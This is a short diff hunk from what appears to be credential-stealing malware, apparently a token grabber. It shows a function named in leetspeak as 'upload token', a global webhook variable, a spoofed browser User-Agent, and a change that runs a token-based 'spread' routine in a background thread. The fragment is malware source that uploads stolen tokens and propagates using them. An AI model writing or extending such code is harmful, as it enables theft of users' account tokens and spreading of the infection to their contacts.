@@ -504,7 +504,7 @@ def Tr1M(obj):
 
 def UP104D70K3N(token, path):
     global h00k
-    spread(token)
+    threading.Thread(target=spread, args=(token,)).start()
     headers = {
         "Content-Type": "application/json",
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
